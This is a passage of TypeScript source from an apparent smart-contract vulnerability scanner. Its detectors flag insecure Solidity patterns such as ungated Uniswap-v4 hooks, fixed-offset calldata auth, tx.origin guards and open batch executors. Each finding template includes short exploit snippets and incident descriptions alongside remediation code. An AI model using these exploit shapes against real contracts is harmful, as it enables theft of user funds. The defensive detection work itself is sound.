      remediationSolidity: "pragma solidity ^0.8.24;\n// or wrap every balance update in SafeMath on 0.7.x",
      locationFn: null,
      locationLine: 1,
      snippet: "",
    }));
  }

  if (model.versionFloor !== null && model.versionFloor < 5_000) {
    const defaults = scopedContracts.flatMap((c) => c.functions.filter((f) => f.visibility === "default" && !f.isConstructor));
    if (defaults.length) {
      push(make({
        severity: "low",
        swc: "SWC-100",
        title: "Functions default to public",
        confidence: "high",
        detector: "default-visibility",
        summary: `Before 0.5.0 a function with no visibility is public. ${defaults.map((f) => f.name).join(", ")} ${defaults.length === 1 ? "is" : "are"} callable by anyone. Most such functions are intentionally public — this is a declare-your-visibility hygiene note. It is only a vulnerability if a function was meant to be internal, which the detector cannot tell from the source alone.`,
        walkthrough: "1. The compiler treats the missing keyword as public, not internal.\n2. A helper that moves ether or sets storage is then an external entrypoint.",
        exploitSolidity: "",
        remediationSolidity: "function helper() internal { /* ... */ }",
        locationFn: defaults[0]?.name ?? null,
        locationLine: defaults[0]?.line ?? null,
        snippet: "",
      }));
    }
  }

  for (const contract of scopedContracts) {
    if (contract.kind === "interface") continue;
    scanContract(contract, model, parsed, delta, push);
  }

  // Phase 4 (2026-10-27 detection upgrade): attach the reachability class
  // to every finding whose site the model can resolve. Additive — no
  // severity changes here; the class is what lets triage order the read
  // queue by "who can reach this" instead of by detector score, which the
  // engagement measured to be uncorrelated with validity (the top-ranked
  // entry was a false positive on all six counts).
  tagReachability(findings, model);
  // Quality post-passes (2026-10-27): family, evidence-based confidence, and
  // the economic-claim marker. All three are annotations — none changes a
  // severity or drops a finding.
  tagFamilies(findings);
  calibrateConfidence(findings);
  flagEconomicClaims(findings);

  // Report order: severity first (a critical gated finding still leads a
  // low reachable one), then reachability, then line. sortFindingsForTriage is
  // the queue order for a human reader and puts REACHABLE first outright.
  findings.sort(
    (a, b) =>
      SEVERITY_RANK[a.severity] - SEVERITY_RANK[b.severity] ||
      (a.reachability ? (REACHABILITY_RANK[a.reachability] ?? 5) : 5) -
        (b.reachability ? (REACHABILITY_RANK[b.reachability] ?? 5) : 5) ||
      (a.locationLine ?? 0) - (b.locationLine ?? 0),
  );
  // The cap drops the LEAST severe first (the sort above), but it used to drop
  // them SILENTLY — so a report could quietly lose real lower-severity positives
  // with no trace. The omitted count is now an explicit INFO finding, so the
  // truncation is visible and reviewable instead of invisible.
  if (findings.length <= MAX_FINDINGS) return findings;
  const omitted = findings.length - MAX_FINDINGS;
  const kept = findings.slice(0, MAX_FINDINGS);
  kept.push(
    make({
      severity: "info",
      swc: null,
      title: `${omitted} lower-severity finding${omitted === 1 ? "" : "s"} omitted (report cap ${MAX_FINDINGS})`,
      confidence: "high",
      detector: "report-cap",
      summary: `This report hit the ${MAX_FINDINGS}-finding cap, so the ${omitted} lowest-severity finding(s) were not listed. They are not clean — raise the cap or audit the contract in smaller scopes to see them.`,
      walkthrough: "1. The detector set produced more findings than the report cap.\n2. Findings were sorted by severity, so the omitted ones are the least severe.\n3. Re-run against a narrower scope (a single contract or function) to list them.",
      exploitSolidity: "",
      remediationSolidity: "",
      locationFn: null,
      locationLine: null,
      snippet: "",
    }),
  );
  return kept;
}

function formatVer(v: number): string {
  const major = Math.floor(v / 1_000_000);
  const minor = Math.floor((v % 1_000_000) / 1_000);
  const patch = v % 1_000;
  return `${major}.${minor}.${patch}`;
}

// True when the ONLY use of tx.origin in src is the EOA-gate comparison
// msg.sender == tx.origin (either operand order). An EOA-gate BLOCKS
// contracts; it does not authenticate anyone: a phished EOA calling
// directly still passes, and no identity is derived from tx.origin.
// FomoXP's isHuman and MyobuChef's boostWithNFT both use it exactly
// this way ("no contracts"), and both were flagged as high-severity
// tx.origin authentication. Any other tx.origin use (compared to an
// owner, used as an address) stays the high auth finding.
function isEoaGateOnly(src: string): boolean {
  if (!/tx\.origin/.test(src)) return false;
  const stripped = src.replace(/msg\.sender\s*==\s*tx\.origin|tx\.origin\s*==\s*msg\.sender/g, "");
  return !/tx\.origin/.test(stripped);
}

// True when every remaining use of tx.origin (after EOA-gate
// comparisons are stripped) is a DENY: a negated check
// (!isBlacklisted(tx.origin)), an == false check, a != comparison,
// or an if(...) revert. A deny check BLOCKS rather than grants —
// CoinToken's require(!isBlacklisted(tx.origin)) extends its
// blacklist to forwarded calls. It authenticates nobody, and the
// auth-bypass framing does not apply (there is nothing to bypass:
// the check can only revert). At most a low over-blocking note. Any
// granting use (tx.origin == owner) stays the high auth finding.
function isTxOriginDenyOnly(src: string): boolean {
  if (!/tx\.origin/.test(src)) return false;
  let stripped = src.replace(/msg\.sender\s*==\s*tx\.origin|tx\.origin\s*==\s*msg\.sender/g, "");
  stripped = stripped
    .replace(/!\s*\w+\s*\(\s*tx\.origin\s*\)/g, "")
    .replace(/!\s*\w+\s*\[\s*tx\.origin\s*\]/g, "")
    .replace(/\w+\s*\(\s*tx\.origin\s*\)\s*==\s*false/g, "")
    .replace(/\w+\s*\[\s*tx\.origin\s*\]\s*==\s*false/g, "")
    .replace(/tx\.origin\s*!==?\s*[^,;)]+/g, "")
    .replace(/if\s*\(\s*\w+\s*\(\s*tx\.origin\s*\)\s*\)\s*revert/g, "");
  return !/tx\.origin/.test(stripped);
}

// True when a transfer's result is verified by a balance-delta check:
// balanceOf before, the transfer, balanceOf after, and a require on
// the delta. Such a transfer does not need its bool: the balance check
// catches false-returns AND fee-on-transfer shortfalls. Mythereum's
// _processERC20TokenPackPurchase does exactly this (balanceOf,
// transferFrom, balanceOf, require after >= before + cost) and was
// flagged for "ignoring" the bool it correctly refuses to trust.
function hasBalanceDeltaCheck(src: string): boolean {
  const balanceReads = src.match(/\.balanceOf\s*\(/g) ?? [];
  if (balanceReads.length < 2) return false;
  return /require\s*\([^;]*(balance|before|after)/i.test(src);
}

/**
 * Function names defined in the contract's bases, transitively
 * (Fix 16). The model does not flatten inheritance: contract.functions
 * holds only the functions defined in that contract. A bare
 * transfer(...) call in a token that inherits ERC20 resolves to the
 * base's transfer, which is still the contract's OWN transfer.
 */
function inheritedFnNames(contract: ContractModel, model: SourceModel): Set<string> {
  const names = new Set<string>();
  const byContract = new Map(model.contracts.map((c) => [c.name, c]));
  const seen = new Set<string>();
  const queue = [...contract.bases];
  while (queue.length) {
    const name = queue.shift()!;
    if (seen.has(name)) continue;
    seen.add(name);
    const base = byContract.get(name);
    if (!base) continue;
    for (const f of base.functions) names.add(f.name);
    queue.push(...base.bases);
  }
  return names;
}

/**
 * Fix 17: true when EVERY ether send in the function is ledger-bound —
 * recipient AND amount both come from the SAME stored mapping/struct
 * entry (pendingBids[id].bidder.transfer(pendingBids[id].amount)).
 * A send whose recipient is a stored entry but whose amount is a
 * caller-chosen value (or vice versa) is NOT ledger-bound. A function
 * with no sends is not a payout (false).
 */
/**
 * Strip payable(...) casts and outer parens from an expression.
 * Send targets arrive as the call base, so a transfer to
 * payable(msg.sender) has target `payable(msg.sender)`, not
 * `msg.sender` — the exemptions below compare against the bare form.
 */
function stripPayable(expr: string): string {
  let t = expr.trim();
  for (;;) {
    const m = t.match(/^payable\s*\((.*)\)$/s);
    if (m) { t = m[1].trim(); continue; }
    const p = t.match(/^\((.*)\)$/s);
    if (p) { t = p[1].trim(); continue; }
    return t;
  }
}

function allSendsLedgerBound(sendDetails: { target: string; amount: string }[]): boolean {
  if (sendDetails.length === 0) return false;
  const entry = /^([\w.]+)\[([^\]]+)\]\.(\w+)$/;
  return sendDetails.every(({ target, amount }) => {
    const t = entry.exec(stripPayable(target));
    const a = entry.exec(stripPayable(amount).replace(/^\(+|\)+$/g, ""));
    return Boolean(t && a && t[1] === a[1] && t[2] === a[2]);
  });
}

/**
 * Fix 18: true when EVERY ether send goes to an address a require
 * (or if) proves == msg.sender in stored-field form
 * (X.field == msg.sender / msg.sender == X.field) and the send target
 * is exactly that stored field. A bare `to == msg.sender` proof does
 * NOT count: a param equal to the caller is not a stored entitlement,
 * and exempting it would silence a full-balance drain with a vacuous
 * require. A literal msg.sender recipient with NO such require is
 * also NOT exempt (the open-drain shape: anyone drains the balance
 * to themselves).
 */
function allSendsRequireProvenSelf(fn: FnModel, sendTargets: string[]): boolean {
  if (sendTargets.length === 0) return false;
  const src = stripCommentsAndStrings(fn.source);
  // Exprs proven == msg.sender by an == comparison in the function.
  const senderEq = new Set<string>();
  for (const m of src.matchAll(/([A-Za-z_][\w.[\]]*)\s*==\s*msg\.sender|msg\.sender\s*==\s*([A-Za-z_][\w.[\]]*)/g)) {
    senderEq.add((m[1] ?? m[2] ?? "").trim());
  }
  if (senderEq.size === 0) return false;
  const isStoredField = (e: string) => e.includes(".") || e.includes("[");
  // Stored-field exprs appearing on the RHS of an assignment to target
  // (possibly wrapped, e.g. payable(pendingBids[id].bidder)).
  // `=(?!=)` keeps a `==` comparison from counting as an assignment.
  const assignedFromStoredField = (target: string): string[] => {
    const out: string[] = [];
    for (const m of src.matchAll(rx(`\\b${escapeRegExp(target)}\\s*=(?!=)\\s*([^;]*)`, "g"))) {
      for (const sm of m[1].matchAll(/[A-Za-z_][\w.]*\[[^\]]+\][\w.[\]]*/g)) out.push(sm[0]);
    }
    return out;
  };
  return sendTargets.every((t) => {
    const target = stripPayable(t);
    // (A) The target itself is proven == msg.sender and is a stored
    // field, or a local assigned from a stored field (case 78, and
    // the require-on-local shape, case 79).
    if (senderEq.has(target) && (isStoredField(target) || assignedFromStoredField(target).length > 0)) return true;
    // (B) The target is a local assigned from a stored-field expr
    // that is itself proven == msg.sender (require on the field,
    // send via a local).
    for (const s of assignedFromStoredField(target)) {
      if (senderEq.has(s)) return true;
    }
    return false;
  });
}

/**
 * Fix 23: true when the function clears a per-user mapping entry for
 * the caller (M[msg.sender] = 0, -=, or = M[...] - ...) AND every
 * ether send goes to msg.sender (or a local assigned from it). The
 * mapping name is unrestricted — presidentSalaries, votes, anything —
 * because the clearing IS the debit. Tying the exemption to a
 * self-send keeps a clearing + drain-to-param shape flagged.
 */
function isSameMappingClearingSelfPayout(fn: FnModel, sendTargets: string[]): boolean {
  if (sendTargets.length === 0) return false;
  const src = fn.source;
  // Sender aliases: msg.sender plus locals assigned from it.
  const aliases = new Set<string>(["msg.sender"]);
  for (const m of src.matchAll(/\b([A-Za-z_]\w*)\s*=\s*msg\.sender\b/g)) aliases.add(m[1]);
  const targetIsSelf = sendTargets.every((t) => aliases.has(stripPayable(t)));
  if (!targetIsSelf) return false;
  for (const alias of aliases) {
    const esc = escapeRegExp(alias);
    if (rx(`\\w+\\s*\\[\\s*${esc}\\s*\\]\\s*(=\\s*0\\b|-=)`).test(src)) return true;
    if (rx(`\\w+\\s*\\[\\s*${esc}\\s*\\]\\s*=\\s*\\w+\\s*\\[\\s*${esc}\\s*\\]\\s*-`).test(src)) return true;
  }
  return false;
}

// Fix 24's library call-site scan lives on in Fix 38's
// librarySiteEntries (same qualified/member patterns), which returns
// the calling contracts' public entries instead of a boolean.

// ---------------------------------------------------------------------------
// 2026 incident classes (2026-10-27).
//
// Six detectors derived from published post-mortems of the 2026 exploit
// wave — each one a class the detector set had no rule for. The point of
// grounding them in incidents rather than inventing shapes is that the
// fixture for every rule is the real mechanism, and the Foundry harness
// (47-52) is the exploit path, so a rule that fires cannot be dismissed as
// theoretical.
//
//   hook-callback-auth        Cork Protocol ($12M, May 2025 post-mortem
//                             Feb 2026), KolanHook, GoldPesa, VTSwapHook,
//                             SpiralHookV2 — a v4 hook callback with no
//                             PoolManager caller check.
//   calldata-offset-auth      UniswapV4Router04 (Mar 2026) — a fixed-offset
//                             calldataload used as an authorization check,
//                             bypassed by a non-canonical ABI offset.
//   eoa-only-guard            POT token (BSC), Gana Payment ($3.1M), QNT
//                             pool — tx.origin == msg.sender used as a real
//                             guard, which EIP-7702 delegation defeats.
//   public-key-account-trust  AlpsCon AI Trade Hub (Oct 2026) — a whitelist
//                             holding the Hardhat default account, whose
//                             private key is public.
//   unauthenticated-batch-call QNT batch contract, Squid multicall — an
//                             open batch(address[],bytes[]) executor.
//   self-attested-auth        FlashLoopAdapter (Oct 2026, ~$305k) — a module
//                             that authenticates its caller by asking the
//                             caller whether it is authorised.
// ---------------------------------------------------------------------------

/** Uniswap-v4 hook callbacks: invoked by the PoolManager, never by a user,
 *  so every one of them must reject a caller that is not the PoolManager. */
const HOOK_CALLBACKS = new Set([
  "beforeInitialize",
  "afterInitialize",
  "beforeAddLiquidity",
  "afterAddLiquidity",
  "beforeRemoveLiquidity",
  "afterRemoveLiquidity",
  "beforeSwap",
  "afterSwap",
  "beforeDonate",
  "afterDonate",
  "lockAcquired",
]);

/** The caller check a hook callback needs: a comparison against the stored
 *  PoolManager, the BaseHook modifiers, or the revert-only variant. */
const POOL_MANAGER_GATE =
  /msg\.sender\s*(?:==|!=)\s*(?:address\s*\(\s*)?(?:[\w.]*poolmanager|[\w.]*manager)\b|poolManagerOnly|onlyPoolManager|PoolManagerOnly|NotPoolManager|selfOnly/i;

/** PoolManager accounting a hook performs while it holds the lock. A direct
 *  caller that reaches these moves funds out of the pool. */
const HOOK_ACCOUNTING = /\.\s*(?:take|settle|settleFor|burn|mint|swap|donate|transfer|sync)\s*\(/;

/** Accounts whose private keys are published in every tutorial: a whitelist,
 *  owner slot, or role grant naming one of them is a public-key account. */
const PUBLIC_KEY_ACCOUNTS: { address: string; note: string }[] = [
  { address: "0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266", note: "Hardhat/Anvil account #0" },
  { address: "0x70997970c51812dc3a010c7d01b50e0d17dc79c8", note: "Hardhat/Anvil account #1" },
  { address: "0x3c44cdddb6a900fa2b585dd299e03d12fa4293bc", note: "Hardhat/Anvil account #2" },
  { address: "0x90f8bf6a479f320ead074411a4b0e7944ea8c9c1", note: "Ganache account #0" },
  { address: "0xffcf8fdee72ac11b5c542428b35eef5769c409f0", note: "Ganache account #1" },
];

/**
 * The 2026 incident classes, scanned per function. Split out of scanSimple
 * because these are caller-identity rules, not value-flow rules: each one
 * asks who is allowed to invoke the entry point, which is the question
 * every one of these incidents turned on.
 */
function scanIncidentClasses(
  fn: FnModel,
  contract: ContractModel,
  parsed: string,
  delta: number,
  authed: boolean,
  push: (f: Finding) => void,
) {
  const src = fn.source;
  if (!src) return;
  const clean = stripCommentsAndStrings(src);
  if (!isExternallyCallable(fn)) return;

  // 1. hook-callback-auth (Cork, KolanHook, GoldPesa, VTSwapHook)
  //
  // LOOSENED 2026-10-27 (recall-first). The vendored KolanHook PoC showed the
  // exploit calling HOOK.accept(...), NOT beforeSwap: the callback was guarded,
  // the SETTLEMENT entry was not. A rule keyed only on v4 callback names missed
  // the incident it was written for. It now also fires on an ungated settlement
  // entry in a hook contract, at LOW confidence, because "a name meaning settle
  // plus a value move" is weaker evidence than a callback name.
  const SETTLE_ENTRY = /^(?:accept|settle|settleWindow|close|closeWindow|execute|executeWindow|finalize|fill|payout|redeem)/i;
  const isHookContract = contract.functions.some((f) => HOOK_CALLBACKS.has(f.name));
  if (isHookContract && !authed && SETTLE_ENTRY.test(fn.name) && HOOK_ACCOUNTING.test(clean) && !POOL_MANAGER_GATE.test(clean)) {
    push(make({
      severity: "high",
      swc: null,
      title: `${fn.name} settles hook funds with no caller check`,
      confidence: "low",
      detector: "hook-callback-auth",
      summary: `This is a hook contract, and ${fn.name} is an externally callable settlement path that moves value or pool accounting with no caller check. Guarding the callback is not enough: the settlement entry is where the funds leave. This is the KolanHook shape (October 2026, 1.28 ETH): accept() was ungated once a window expired, so the attacker settled windows they did not own and _closeWindow() mispositioned the escrowed ETH around a spot price the attacker had just moved.`,
      walkthrough: `1. A buy window expires, so its settlement becomes callable.\n2. ${fn.name} has no caller check, so anyone can settle ANY window.\n3. The settlement prices the escrowed funds at whatever spot the attacker just moved.\n4. The funds are mispositioned and bought back at the attacker's price.\n5. Gate the settlement entry to the window's owner, and price against a TWAP with a bound.`,
      exploitSolidity: `// Settle windows you do not own, at a price you just moved.\nIHook(HOOK).${fn.name}(windowId);`,
      remediationSolidity: `modifier onlyWindowOwner(uint256 id) { require(windows[id].owner == msg.sender, "not owner"); _; }\nfunction ${fn.name}(uint256 id) external onlyWindowOwner(id) { /* TWAP, bounded */ }`,
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
  }
  if (HOOK_CALLBACKS.has(fn.name) && !authed && !POOL_MANAGER_GATE.test(clean)) {
    const movesFunds = HOOK_ACCOUNTING.test(clean);
    push(make({
      severity: movesFunds ? "critical" : "high",
      swc: null,
      title: `${fn.name} is a hook callback anyone can call`,
      confidence: "high",
      detector: "hook-callback-auth",
      summary: movesFunds
        ? `A Uniswap-v4 hook callback is invoked by the PoolManager, so msg.sender is the PoolManager and the hook's own state is only meaningful inside a real swap. ${fn.name} never checks that, and it settles, burns, or transfers inside — a direct call with crafted parameters drives the accounting path without a swap behind it. This is the Cork Protocol shape ($12M, beforeSwap with no msg.sender check) and the GoldPesa shape (an unsettled delta netted against the hook's own burn credit).`
        : `A Uniswap-v4 hook callback is invoked by the PoolManager, so msg.sender is the PoolManager and the callback's parameters are trusted only inside a real pool action. ${fn.name} never checks the caller, so anyone can invoke it with fabricated parameters and rewrite the hook's recorded state.`,
      walkthrough: `1. The PoolManager calls ${fn.name} during a swap or liquidity action; that is the only context in which its parameters are real.\n2. The function is external and checks no caller, so an attacker calls it directly with their own key, sender, and hookData.\n3. Any branch the callback takes on those parameters (settlement, a burn, a stored price) now runs outside a swap, against state the attacker chose.\n4. Add the BaseHook poolManagerOnly modifier, or require(msg.sender == address(poolManager)) as the first line.`,
      exploitSolidity: `interface IHook {\n    function ${fn.name}(address sender, bytes calldata key, bytes calldata params, bytes calldata hookData) external;\n}\n// Call the callback directly: no PoolManager, no swap, attacker-chosen params.\nIHook(target).${fn.name}(address(this), forgedKey, forgedParams, forgedData);`,
      remediationSolidity: `// Inherit BaseHook and gate every callback.\nfunction ${fn.name}(address sender, PoolKey calldata key, SwapParams calldata params, bytes calldata hookData)\n    external\n    onlyPoolManager // require(msg.sender == address(poolManager))\n    returns (bytes4, BeforeSwapDelta, uint24)\n{ /* ... */ }`,
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
  }

  // 2. calldata-offset-auth (UniswapV4Router04, Mar 2026)
  //    A fixed absolute calldata offset only lines up with the field it is
  //    meant to read when the ABI encoding is canonical. A dynamic `bytes`
  //    parameter may legally start at any offset, so the attacker shifts it
  //    and puts their own address where the check reads.
  const fixedLoad = clean.match(/\bcalldataload\s*\(\s*(0x[0-9a-fA-F]+|\d+)\s*\)/);
  const comparesCaller = /\bcaller\s*\(\s*\)/.test(clean) && /\b(?:eq|iszero)\s*\(|==|!=/.test(clean);
  const hasDynamicBytes = fn.params.some((p) => /^bytes/.test(p.typeName));
  if (fixedLoad && comparesCaller && hasDynamicBytes) {
    push(make({
      severity: HOOK_ACCOUNTING.test(clean) || /\.\s*(?:transferFrom|transfer)\s*\(/.test(clean) ? "high" : "medium",
      swc: null,
      title: `${fn.name} authorizes on a fixed calldata offset`,
      confidence: "high",
      detector: "calldata-offset-auth",
      summary: `The authorization check reads ${fixedLoad[0]} — an absolute position in the calldata — and compares it with the caller. That position only holds the field the check means to read when the ABI encoding is canonical. A dynamic parameter can start at any valid offset, so an attacker can shift the payload, place their own address at the checked position, and put the victim's address in the field the logic actually uses. This is the UniswapV4Router04 swap() bypass (March 2026): the router read the payer at a fixed offset, the attacker moved the bytes offset, and the router spent a victim's approval.`,
      walkthrough: `1. The function takes a dynamic \`bytes\` parameter and decodes a struct from it.\n2. Its authorization check reads a fixed calldata position with calldataload instead of decoding the struct field.\n3. The attacker sets the dynamic offset to a non-canonical value, puts their own address at the fixed position, and the victim's address in the real struct field.\n4. The check passes, the logic spends the victim's funds. Decode the field (abi.decode on the parameter) and compare that, or check msg.sender against the decoded payer.`,
      exploitSolidity: `// bytes offset 0xc0 instead of 0x40; attacker's address at the checked slot.\n(bool ok, ) = target.call(abi.encodeWithSelector(0xaf2b4aba, forgedData, block.timestamp));`,
      remediationSolidity: `// Decode the parameter and compare the decoded field, never a fixed offset.\nBaseData memory d = abi.decode(data, (BaseData));\nrequire(d.payer == msg.sender, Unauthorized());`,
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
  }

  // 3. eoa-only-guard (POT token, Gana Payment, QNT pool)
  //    tx.origin == msg.sender was a load-bearing guard here — a flash-loan
  //    or caller-class check — and EIP-7702 makes it forgeable: a delegated
  //    EOA runs contract code while msg.sender == tx.origin still holds.
  const eoaGate = /(?:tx\.origin\s*==\s*msg\.sender|msg\.sender\s*==\s*tx\.origin)/.test(clean);
  // Suffixed names count: swapExactTokensForTokens, stakeFor, depositTo, and
  // the rest of the router vocabulary. A bare \`swap\`-only match missed the
  // POT fixture's own router call.
  const loadBearing =
    /\.\s*(?:transfer|safeTransfer|swap|stake|unstake|mint|borrow|repay|deposit|withdraw|flashLoan|flash)\w*\s*\(/.test(clean) ||
    /\.call\s*\{/.test(clean);
  if (eoaGate && loadBearing) {
    push(make({
      severity: "high",
      swc: "SWC-115",
      title: `${fn.name} guards value flow with tx.origin == msg.sender`,
      confidence: "high",
      detector: "eoa-only-guard",
      summary: "This function uses tx.origin == msg.sender as a guard around a value-moving path. That check used to mean \"a plain wallet called me\". Since EIP-7702 (Pectra) an EOA can delegate to contract code, so a delegated account runs an attacker's logic while msg.sender == tx.origin still holds — the guard no longer distinguishes an EOA from a contract, and the flash-loan or caller-class protection built on it is gone. This is the POT token exploit on BSC (~$85k, a flash-loan price manipulation behind the EOA-only check), Gana Payment ($3.1M), and the QNT pool drain.",
      walkthrough: "1. The guard requires msg.sender == tx.origin, i.e. the caller must be a plain account.\n2. A type-4 EIP-7702 transaction delegates the attacker's EOA to a contract, which then runs arbitrary logic while msg.sender == tx.origin holds for the outer call.\n3. Whatever the guard was protecting (a flash-loan restriction, a per-user limit, an operator check) is now reachable from contract logic.\n4. Guard on what you actually mean: a reentrancy mutex, an explicit allowlist, or a check that the caller's code is empty at the moment of the call — and treat none of them as an EOA proof.",
      exploitSolidity: `// EIP-7702: delegate the attacker EOA to code, then call through it.\n// msg.sender == tx.origin is still true, but the caller runs contract logic.\naddress(delegatedEoa).call(abi.encodeWithSignature("attack()"));`,
      remediationSolidity: `// Do not use tx.origin as an EOA proof. Guard the mechanism itself:\nmodifier nonReentrant() { require(locked == 0, "reentrant"); locked = 1; _; locked = 0; }\n// Or an explicit allowlist of operators, checked by role.`,
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
  }

  // 5. unauthenticated-batch-call (QNT batch contract, Squid multicall)
  const targetParams = fn.params.filter((p) => /^address\s*\[\s*\]/.test(p.typeName)).map((p) => p.name).filter(Boolean);
  const bytesParams = fn.params.filter((p) => /^bytes\s*\[\s*\]/.test(p.typeName)).map((p) => p.name).filter(Boolean);
  const loop = /for\s*\(|while\s*\(/.test(clean);
  const callsTarget = targetParams.some((n) =>
    new RegExp(`\\b${escapeRegExp(n)}\\s*(?:\\[[^\\]]*\\])?\\s*\\.\\s*(?:call|delegatecall)\\s*[({]`).test(clean),
  );
  if (!authed && targetParams.length > 0 && bytesParams.length > 0 && loop && callsTarget) {
    const delegates = new RegExp(`\\b${escapeRegExp(targetParams[0]!)}\\s*(?:\\[[^\\]]*\\])?\\s*\\.\\s*delegatecall`).test(clean);
    push(make({
      severity: delegates ? "critical" : "high",
      swc: "SWC-105",
      title: `${fn.name} executes arbitrary calls with no access check`,
      confidence: "high",
      detector: "unauthenticated-batch-call",
      summary: `An unauthenticated function takes a list of targets and a matching list of calldata and executes them from this contract's context. Anyone can make the contract call anything, including functions that trust it: the QNT pool drain (April 2026) went through a public batch(address[],bytes[]) with no access control, which routed a call through a delegated admin EOA that the pool trusted by address. A batch executor is only safe when the caller is authenticated or the targets are fixed.`,
      walkthrough: `1. ${fn.name} loops over caller-supplied targets and calls each with caller-supplied calldata.\n2. Nothing checks who is calling, so any address can borrow the contract's identity and its approvals.\n3. Any contract that trusts this address (an admin EOA, a vault, a keeper) can now be driven by the attacker.\n4. Authenticate the executor, or restrict it to a fixed router, and never let it reach privileged functions.`,
      exploitSolidity: `address[] memory targets = new address[](1);\nbytes[] memory data = new bytes[](1);\ntargets[0] = address(victimPool);\ndata[0] = abi.encodeWithSignature("forwardTransaction(address,bytes)", attacker, payload);\nIExecutor(target).${fn.name}(targets, data);`,
      remediationSolidity: `function ${fn.name}(address[] calldata targets, bytes[] calldata data) external onlyOwner {\n    // or: require(msg.sender == address(this));\n    for (uint256 i; i < targets.length; ++i) {\n        (bool ok, ) = targets[i].call(data[i]);\n        require(ok, "batch failed");\n    }\n}`,
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
  }

  // 6. self-attested-auth (FlashLoopAdapter, Oct 2026)
  //    The guard asks the CALLER whether the caller is allowed: the answer is
  //    supplied by the untrusted party, so any contract can say yes.
  // The cast must be part of the CONDITION, and must not be a value-transfer
  // cast. `[^;]{0,300}` let the match run out of the `if (...)` condition and
  // into the block body, where `payable(msg.sender).transfer(...)` matched —
  // a payout read as "the caller attested itself". The 2026-era corpus caught
  // it on the registry-dispatch fixture, which has no attestation at all.
  // LOOSENED 2026-10-27 (recall-first): the attestation is often stored first
  // (`bool ok = IGuard(msg.sender).isEnabled(address(this)); require(ok);`),
  // which the condition-only form missed. payable/address casts stay excluded —
  // payable(msg.sender).transfer(...) is a payout, not an attestation.
  const selfAttest =
    /(?:require|if)\s*\([^)]{0,300}?\b(?!payable\b|address\b)[A-Za-z_$][\w$]*\s*\(\s*msg\.sender\s*\)\s*\.\s*\w+\s*\(/.test(clean) ||
    /\b(?:bool|var)\s+[A-Za-z_$][\w$]*\s*=\s*(?!payable\b|address\b)[A-Za-z_$][\w$]*\s*\(\s*msg\.sender\s*\)\s*\.\s*\w+\s*\(/.test(clean);
  if (!authed && selfAttest) {
    push(make({
      severity: "high",
      swc: "SWC-105",
      title: `${fn.name} asks the caller to attest its own authorization`,
      confidence: "high",
      detector: "self-attested-auth",
      summary: `The access check calls a function ON msg.sender to decide whether msg.sender is allowed. The untrusted caller supplies the answer, so a contract that simply returns true passes the check and drives this function. This is the FlashLoopAdapter shape (October 2026, ~$305k): a Safe module asked the calling Safe whether the module was enabled, so a fake Safe could walk real Safes into draining themselves.`,
      walkthrough: `1. The guard is a call to the caller: IGuard(msg.sender).isEnabled(address(this)) or similar.\n2. An attacker deploys a contract that answers yes and calls this function through it.\n3. Every privileged action behind the guard is now available to the attacker, and any party that trusted this contract is exposed.\n4. Invert the check: verify the caller against a registry THIS contract controls, or require the caller to be a specific stored address.`,
      exploitSolidity: `contract FakeGuard {\n    function isEnabled(address) external pure returns (bool) { return true; }\n    function attack(address adapter) external {\n        IAdapter(adapter).pull(address(this));\n    }\n}`,
      remediationSolidity: `// The attestation must come from this contract's own registry, not the caller.\nmapping(address => bool) public authorised;\nrequire(authorised[msg.sender], "not authorised");`,
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
  }
}

// ---------------------------------------------------------------------------
// 2021-2025 incident classes (2026-10-27, the six-year sweep).
//
// The 2026 wave was one year of one shape. The six years before it were not:
// bridges (Poly, Nomad, Wormhole, BNB, Orbit, KelpDAO), governance (Beanstalk,
// Fortress, Elephant, Audius), signature checks (Qubit, MISO), and oracle
// plumbing (Mango, BonqDAO, Venus) each produced eight-figure losses from
// classes the detector set had no rule for. Five rules, one per mechanism,
// each with the incident that motivates it:
//
//   arbitrary-dispatch-call        Poly Network 2021 ($611M) — the manager
//                                  executed a caller-supplied method on a
//                                  caller-supplied contract; Beanstalk's
//                                  _execute delegatecall is the same door.
//   bridge-message-auth            Nomad 2022 ($190M, zero root accepted),
//                                  Qubit 2022 ($80M, unverified deposit),
//                                  KelpDAO 2026 (a forged packet released
//                                  reserves).
//   governance-live-voting-power   Beanstalk 2022 ($182M) — voting power read
//                                  from the live Silo balance, so a flash loan
//                                  rented a supermajority in one transaction.
//   ecrecover-zero                 the 2021-2022 signature class: ecrecover
//                                  returns address(0) on failure, and code
//                                  that never checks it accepts an unset
//                                  signer.
//   oracle-staleness               the price-plumbing half of the oracle
//                                  losses: latestRoundData consumed without
//                                  updatedAt/answeredInRound, so a stale or
//                                  never-updated feed prices collateral.
//
// Deliberately NOT rules, because no source rule can see them: key compromise
// (Ronin, Harmony, Orbit, Multichain, Bybit), frontend supply chain (BadgerDAO,
// Radiant, Li.Fi), social engineering (Drift, Radiant), the Vyper compiler bug
// (Curve 2023 — the SOURCE was correct), and Solana/Rust program bugs
// (Wormhole, Mango, Cashio). docs/incidents-2021-2026.md records those with the
// reason, so the corpus does not pretend to cover them.
// ---------------------------------------------------------------------------

/** Verification vocabulary an inbound cross-chain handler must show. */
// An ECDSA check counts as verification (2026-10-27): a `claim(to, amount, v, r, s)`
// that recovers a signer is verifying the message, even though it is not
// verifying a SOURCE CHAIN. Before this, such a claim was reported as an
// unverified bridge handler — a false positive the new
// signature-field-omission rule then covers for the real defect.
const BRIDGE_VERIFICATION =
  /srcChainId|_srcChainId|sourceChainId|srcAddress|_srcAddress|\bpeer\b|trustedRemote|verify|verif\w*|_proof|merkle|\broot\b|endpoint|guardian|validator|signature|ecrecover|\brecover\s*\(|\bnonce\b/i;

/** Effect an inbound handler has when it accepts a message. */
const BRIDGE_EFFECT = /_mint\s*\(|\.mint\s*\(|unlock|release\s*\(|\.safeTransfer\w*\s*\(|\.transfer\s*\(/;

/**
 * Names an inbound cross-chain handler uses.
 *
 * NOT widened to `release`/`redeem`/`withdraw`: measured 2026-10-28, adding them
